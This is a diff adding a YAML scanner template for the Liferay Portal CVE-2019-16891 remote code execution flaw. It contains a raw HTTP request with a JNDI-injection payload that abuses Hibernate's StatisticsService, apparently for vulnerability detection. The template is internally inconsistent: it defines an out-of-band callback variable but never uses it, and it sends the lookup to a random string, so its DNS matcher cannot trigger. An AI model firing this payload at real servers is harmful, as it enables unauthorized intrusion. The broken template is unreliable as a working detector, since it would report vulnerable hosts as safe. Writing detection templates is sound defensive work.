@@ -1,0 +1,32 @@
+id: liferay-portal-rce-cve-2019-16891
+
+info:
+  name: Liferay Portal RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    A code issue vulnerability exists in Liferay Portal CE version 6.2.5. This vulnerability stems from improper design or implementation problems in the code development process of network systems or products. Successful exploitation could lead to remote code execution.
+  classification:
+    cve-id: CVE-2019-16891
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  tags: rce,liferay
+
+variables:
+  checkStr: "{{rand_base(4)}}"
+  jndiUrl: "ldap://{{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        GET /c/portal/portlet_url?parameterMap={"javaClass":"org.hibernate.jmx.StatisticsService","sessionFactoryJNDIName":"ldap://{{checkStr}}"} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 400
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
